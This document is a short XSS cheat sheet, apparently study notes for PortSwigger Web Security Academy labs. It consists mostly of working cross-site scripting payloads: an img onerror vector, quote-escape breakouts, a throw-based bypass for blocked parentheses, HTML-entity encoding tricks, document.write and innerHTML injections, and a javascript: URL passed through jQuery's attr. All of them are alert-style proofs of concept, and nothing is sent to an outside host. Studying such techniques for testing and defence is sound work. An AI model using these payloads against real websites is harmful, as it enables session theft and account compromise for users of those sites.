Cross-site scripting cheat sheet:
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```

## Standard XSS vector:
```
<img src=1 onerror=print()>
```

## General tip:
Sometimes these may work **ONLY** if you URL encode the payload in burp

## If `'` character is escaped then you can try:
```
\';alert(document.domain)//
```
Which will be converted to
```
\\';alert(document.domain)//
```

## if some characters are blocked (e.g. parenthesis):
```
onerror=alert;throw 33
```
Which will pass `33` to `alert`
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

## if some characters are sanitized try html-encoding:
```
&apos;-alert(document.domain)-&apos;
```
e.g. in req.body:
website=http://bbb.com%3f%26apos%3b-alert(1)-%26apos%3b

## check for template literals ${} in js

## document.write (don't forget to close other html tags gracefully so that script is not brocken)
The document.write sink works with script elements, so you can use a simple payload, such as the one below: 
```
document.write('... <script>alert(document.domain)</script> ...');
```
e.g. if we have:
```
document.write('<option selected>'+store+'</option>'
```
then we can exploit xss:
```
storeId=any1</option><script>alert(33)</script><option>any2
```

## innerHtml might also be interesting:
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

## `attr` func in jQuery:
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
```
?returnUrl=javascript:alert(document.domain)
```
